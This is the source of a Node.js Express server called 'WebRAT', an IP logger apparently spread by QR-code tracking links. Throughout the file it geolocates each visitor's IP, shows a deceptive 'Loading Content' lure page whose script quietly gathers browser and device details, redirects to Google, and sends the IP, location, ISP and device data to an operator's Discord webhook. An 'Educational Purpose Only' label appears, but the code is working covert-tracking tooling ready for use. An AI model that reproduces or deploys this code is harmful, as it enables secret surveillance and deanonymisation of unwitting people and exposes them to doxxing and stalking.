const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

// In-memory storage for sessions (use database in production)
const sessions = new Map();
const visitLogs = new Map();

// Helper function to get client IP
function getClientIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress ||
           req.ip ||
           'Unknown';
}

// Helper function to get location data
async function getLocationData(ip) {
    try {
        if (ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') {
            return {
                city: 'Unknown',
                region: 'Unknown',
                country: 'Unknown',
                loc: 'Unknown',
                org: 'Unknown',
                timezone: 'Unknown'
            };
        }

        const response = await fetch(`https://ipinfo.io/${ip}/json`);
        const data = await response.json();
        
        return {
            city: data.city || 'Unknown',
            region: data.region || 'Unknown',
            country: data.country || 'Unknown',
            loc: data.loc || 'Unknown',
            org: data.org || 'Unknown',
            timezone: data.timezone || 'Unknown'
        };
    } catch (error) {
        console.error('Error getting location data:', error);
        return {
            city: 'Unknown',
            region: 'Unknown',
            country: 'Unknown',
            loc: 'Unknown',
            org: 'Unknown',
            timezone: 'Unknown'
        };
    }
}

// Register new tracking session
app.post('/api/register', async (req, res) => {
    try {
        const {
            session_id,
            computer_name,
            discord_webhook,
            channel_id,
            message,
            created_at,
            creator,
            target_info
        } = req.body;

        if (!session_id) {
            return res.status(400).json({ error: 'Session ID required' });
        }

        // Store session data
        sessions.set(session_id, {
            session_id,
            computer_name: computer_name || 'Unknown',
            discord_webhook: discord_webhook || '',
            channel_id: channel_id || '',
            message: message || 'Check this out!',
            created_at: created_at || new Date().toISOString(),
            creator: creator || 'Unknown',
            target_info: target_info || {},
            visits: 0,
            visitors: []
        });

        visitLogs.set(session_id, []);

        console.log(`New session registered: ${session_id} from ${computer_name}`);
        
        res.json({ 
            success: true, 
            session_id,
            tracking_url: `/track/${session_id}`,
            status: 'Session registered successfully'
        });

    } catch (error) {
        console.error('Registration error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Handle QR code visits and tracking
app.get('/track/:session_id', async (req, res) => {
    try {
        const { session_id } = req.params;
        const session = sessions.get(session_id);

        if (!session) {
            return res.status(404).send(`
                <!DOCTYPE html>
                <html>
                <head>
                    <title>Link Not Found</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1">
                    <style>
                        body { font-family: Arial, sans-serif; text-align: center; margin-top: 50px; background: #f5f5f5; }
                        .error { background: white; padding: 40px; border-radius: 10px; display: inline-block; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                        h1 { color: #ff4444; }
                    </style>
                </head>
                <body>
                    <div class="error">
                        <h1>404 - Link Not Found</h1>
                        <p>This tracking link has expired or doesn't exist.</p>
                    </div>
                </body>
                </html>
            `);
        }

        // Get visitor info
        const clientIP = getClientIP(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const referer = req.headers['referer'] || 'Direct';
        const acceptLanguage = req.headers['accept-language'] || 'Unknown';
        const timestamp = new Date().toISOString();

        // Get location data
        const locationData = await getLocationData(clientIP);

        // Create visitor data
        const visitorData = {
            ip: clientIP,
            user_agent: userAgent,
            referer: referer,
            language: acceptLanguage,
            timestamp: timestamp,
            location: locationData,
            session_id: session_id
        };

        // Update session stats
        session.visits++;
        session.visitors.push(visitorData);

        // Store visit log
        const logs = visitLogs.get(session_id) || [];
        logs.push(visitorData);
        visitLogs.set(session_id, logs);

        // Send to Discord webhook if configured
        if (session.discord_webhook) {
            try {
                const webhookData = {
                    embeds: [{
                        title: "🎯 QR Code Visitor Tracked",
                        description: `Someone scanned the QR code from **${session.computer_name}**`,
                        color: 0xff4444,
                        timestamp: timestamp,
                        fields: [
                            {
                                name: "🌐 IP Address",
                                value: clientIP,
                                inline: true
                            },
                            {
                                name: "📍 Location",
                                value: `${locationData.city}, ${locationData.region}, ${locationData.country}`,
                                inline: true
                            },
                            {
                                name: "🏢 ISP/Organization",
                                value: locationData.org.substring(0, 100),
                                inline: true
                            },
                            {
                                name: "💻 Device Info",
                                value: userAgent.substring(0, 100),
                                inline: false
                            },
                            {
                                name: "🔗 Referrer",
                                value: referer.substring(0, 100),
                                inline: true
                            },
                            {
                                name: "🌍 Language",
                                value: acceptLanguage.substring(0, 50),
                                inline: true
                            },
                            {
                                name: "📊 Session Stats",
                                value: `Visit #${session.visits} for session ${session_id}`,
                                inline: true
                            }
                        ],
                        footer: {
                            text: "Memphis RAT - Educational Purpose Only"
                        }
                    }]
                };

                await fetch(session.discord_webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(webhookData)
                });

                console.log(`Webhook sent for session ${session_id} - Visit #${session.visits}`);
            } catch (webhookError) {
                console.error('Webhook error:', webhookError);
            }
        }

        // Serve a convincing page that redirects after data collection
        const redirectPage = `
            <!DOCTYPE html>
            <html>
            <head>
                <title>${session.message}</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <meta charset="UTF-8">
                <style>
                    body {
                        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                        margin: 0;
                        padding: 20px;
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        min-height: 100vh;
                        display: flex;
                        align-items: center;
                        justify-content: center;
                    }
                    .container {
                        background: white;
                        padding: 40px;
                        border-radius: 15px;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
                        text-align: center;
                        max-width: 500px;
                        width: 100%;
                    }
                    .logo {
                        font-size: 48px;
                        margin-bottom: 20px;
                    }
                    h1 {
                        color: #333;
                        margin-bottom: 15px;
                        font-size: 28px;
                    }
                    p {
                        color: #666;
                        line-height: 1.6;
                        margin-bottom: 25px;
                    }
                    .loading {
                        display: inline-block;
                        width: 40px;
                        height: 40px;
                        border: 4px solid #f3f3f3;
                        border-top: 4px solid #667eea;
                        border-radius: 50%;
                        animation: spin 1s linear infinite;
                        margin: 20px 0;
                    }
                    @keyframes spin {
                        0% { transform: rotate(0deg); }
                        100% { transform: rotate(360deg); }
                    }
                    .redirect-text {
                        color: #888;
                        font-size: 14px;
                        margin-top: 15px;
                    }
                </style>
                <script>
                    // Collect additional browser info
                    const browserInfo = {
                        screen: screen.width + 'x' + screen.height,
                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                        language: navigator.language,
                        platform: navigator.platform,
                        cookieEnabled: navigator.cookieEnabled,
                        onlineStatus: navigator.onLine,
                        plugins: navigator.plugins.length
                    };
                    
                    // Send additional data
                    fetch('/api/browser-info', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            session_id: '${session_id}',
                            browser_info: browserInfo
                        })
                    }).catch(e => console.log('Info collection failed'));
                    
                    // Redirect after 3 seconds
                    setTimeout(() => {
                        window.location.href = 'https://www.google.com';
                    }, 3000);
                </script>
            </head>
            <body>
                <div class="container">
                    <div class="logo">🎁</div>
                    <h1>Loading Content...</h1>
                    <p>${session.message}</p>
                    <div class="loading"></div>
                    <div class="redirect-text">Redirecting you to the content...</div>
                </div>
            </body>
            </html>
        `;

        res.send(redirectPage);

    } catch (error) {
        console.error('Tracking error:', error);
        res.status(500).send('Internal server error');
    }
});

// Receive additional browser info
app.post('/api/browser-info', (req, res) => {
    try {
        const { session_id, browser_info } = req.body;
        const session = sessions.get(session_id);
        
        if (session && session.visitors.length > 0) {
            // Add browser info to the latest visitor
            const latestVisitor = session.visitors[session.visitors.length - 1];
            latestVisitor.browser_info = browser_info;
            
            console.log(`Enhanced browser info collected for session ${session_id}`);
        }
        
        res.json({ success: true });
    } catch (error) {
        console.error('Browser info error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Get session statistics
app.get('/api/sessions/:session_id', (req, res) => {
    try {
        const { session_id } = req.params;
        const session = sessions.get(session_id);
        
        if (!session) {
            return res.status(404).json({ error: 'Session not found' });
        }
        
        res.json({
            session_id: session.session_id,
            computer_name: session.computer_name,
            visits: session.visits,
            created_at: session.created_at,
            visitors: session.visitors,
            message: session.message
        });
    } catch (error) {
        console.error('Session stats error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Admin endpoint to list all sessions
app.get('/api/admin/sessions', (req, res) => {
    try {
        const sessionList = Array.from(sessions.values()).map(session => ({
            session_id: session.session_id,
            computer_name: session.computer_name,
            visits: session.visits,
            created_at: session.created_at,
            creator: session.creator,
            message: session.message
        }));
        
        res.json({
            total_sessions: sessionList.length,
            sessions: sessionList
        });
    } catch (error) {
        console.error('Admin sessions error:', error);
        res.status(500).json({ error: 'Internal server error' });
    }
});

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({
        status: 'healthy',
        timestamp: new Date().toISOString(),
        sessions: sessions.size,
        uptime: process.uptime()
    });
});

// Root endpoint
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>WebRAT - IP Logger Service</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { 
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    margin: 0; 
                    padding: 40px; 
                    background: #1a1a1a; 
                    color: white;
                    line-height: 1.6;
                }
                .container { max-width: 800px; margin: 0 auto; }
                h1 { color: #ff4444; font-size: 2.5em; margin-bottom: 10px; }
                .subtitle { color: #888; font-size: 1.2em; margin-bottom: 40px; }
                .feature { 
                    background: #2a2a2a; 
                    padding: 20px; 
                    margin: 20px 0; 
                    border-radius: 10px; 
                    border-left: 4px solid #ff4444;
                }
                .endpoint { 
                    background: #333; 
                    padding: 10px; 
                    border-radius: 5px; 
                    font-family: monospace; 
                    margin: 10px 0;
                }
                .status { color: #44ff44; }
                .warning { color: #ffaa44; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎯 WebRAT</h1>
                <div class="subtitle">Advanced IP Logger & Tracking Service</div>
                
                <div class="feature">
                    <h3>🚀 Service Status</h3>
                    <p class="status">✅ Online and operational</p>
                    <p>Active sessions: ${sessions.size}</p>
                    <p>Server uptime: ${Math.floor(process.uptime())} seconds</p>
                </div>
                
                <div class="feature">
                    <h3>📡 API Endpoints</h3>
                    <div class="endpoint">POST /api/register - Register tracking session</div>
                    <div class="endpoint">GET /track/:session_id - Handle visitor tracking</div>
                    <div class="endpoint">GET /api/sessions/:session_id - Get session stats</div>
                    <div class="endpoint">GET /api/health - Health check</div>
                </div>
                
                <div class="feature">
                    <h3>🔒 Data Collection</h3>
                    <ul>
                        <li>IP Address & Geolocation</li>
                        <li>Device & Browser Information</li>
                        <li>Screen Resolution & Timezone</li>
                        <li>Language & Platform Details</li>
                        <li>Referrer & Visit Timestamp</li>
                    </ul>
                </div>
                
                <div class="feature">
                    <h3 class="warning">⚠️ Educational Purpose Only</h3>
                    <p>This service is designed for educational and authorized security testing purposes only. 
                    Users are responsible for complying with all applicable laws and regulations.</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Server error:', error);
    res.status(500).json({ error: 'Internal server error' });
});

// 404 handler
app.use((req, res) => {
    res.status(404).json({ error: 'Endpoint not found' });
});

// Start server
app.listen(PORT, () => {
    console.log(`🎯 WebRAT IP Logger running on port ${PORT}`);
    console.log(`📡 Webhook endpoint: /track/:session_id`);
    console.log(`🔧 Admin panel: /api/admin/sessions`);
    console.log(`⚠️  Educational Purpose Only`);
});

// Export for Vercel
module.exports = app;
